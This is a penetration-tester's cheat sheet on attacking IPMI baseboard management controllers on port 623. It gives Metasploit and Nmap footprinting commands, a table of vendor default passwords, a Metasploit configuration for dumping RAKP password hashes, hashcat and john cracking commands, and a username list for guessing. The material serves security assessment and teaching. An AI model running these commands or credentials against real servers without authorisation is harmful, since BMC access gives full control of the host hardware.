# IPMI - U623

{% hint style="info" %}
`IPMI` is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system.

IPMI is typically used in three ways:

* Before the OS has booted to modify BIOS settings
* When the host is fully powered down
* Access to a host after a system failure

The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system.
{% endhint %}

### Dangerous Settings

* During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.&#x20;
* This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`&#x20;

### Footprinting

{% tabs %}
{% tab title="Metasploit" %}
{% code lineNumbers="true" %}
```shellscript
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <IP>
run
```
{% endcode %}
{% endtab %}

{% tab title="Nmap" %}
{% code lineNumbers="true" %}
```shellscript
sudo nmap -sU --script ipmi-version -p 623 <IP>
```
{% endcode %}
{% endtab %}
{% endtabs %}

### Default Passwords

* <table><thead><tr><th width="328.28570556640625">Product Name</th><th width="127.1429443359375">Default Username</th><th width="261.9932861328125">Default Password</th></tr></thead><tbody><tr><td><strong>HP Integrated Lights Out (iLO)</strong></td><td>Administrator</td><td>randomized 8-character string</td></tr><tr><td><strong>Dell Remote Access Card (iDRAC, DRAC)</strong></td><td>root</td><td>calvin</td></tr><tr><td><strong>IBM Integrated Management Module (IMM)</strong></td><td>USERID</td><td>PASSW0RD (with a zero)</td></tr><tr><td><strong>Fujitsu Integrated Remote Management Controller</strong></td><td>admin</td><td>admin</td></tr><tr><td><strong>Supermicro IPMI (2.0)</strong></td><td>ADMIN</td><td>ADMIN</td></tr><tr><td><strong>Oracle/Sun Integrated Lights Out Manager (ILOM)</strong></td><td>root</td><td>changeme</td></tr><tr><td><strong>ASUS iKVM BMC</strong></td><td>admin</td><td>admin</td></tr></tbody></table>

### Dump Hashes

{% code lineNumbers="true" %}
```shellscript
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <>
services -p 623 -R
set OUTPUT_JOHN_FILE ipmi_john.txt
set OUTPUT_HASHCAT_FILE ipmi_hashcat.txt
set USER_FILE user_file.txt
set THREADS 25
set SESSION_MAX_ATTEMPTS 10
```
{% endcode %}

### Hash Cracking

{% code lineNumbers="true" %}
```shellscript
eg: HP iLO
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
hashcat -m 7300 <hash_file> <wordlist>
john --fork=8 --incremental:alpha --format=rakp <hash_file>
```
{% endcode %}

<details>

<summary>User_File</summary>

ADMIN\
admin\
root\
Administrator\
USERID\
guest\
Admin\
adminilo\
iloadmin\
ibmadmin\
ibm\
adminibm\
capadmin\
admincap\
supp0rt\
support\
IBM\_CAP\
temp\
SeAdmin\
nutanix\
vxpsvc\
PTAdmin\
edcadmin\
bladmin\
ipmiadmin\
logicmonitor

</details>

### Reference

[Penetration Tester's Guide to IPMI and BMCs](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)
